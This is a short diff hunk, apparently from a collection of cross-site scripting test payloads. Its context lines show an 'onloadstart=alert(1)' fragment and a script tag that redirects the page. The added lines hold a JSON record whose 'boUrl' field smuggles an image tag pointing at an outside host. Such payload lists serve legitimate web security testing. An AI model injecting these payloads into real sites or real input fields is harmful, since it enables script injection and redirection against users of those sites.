@@ -89,3 +89,5 @@ onloadstart=alert(1)>
 <script>
             window.location = "http://youtube.com";
 </script>
+
+{"email":"admin@gothamcity.com","appId":"sso","boUrl":"https://admin.myapp.com?<img src=\“https://icontrolit.gothamcity.com/?test=”}}
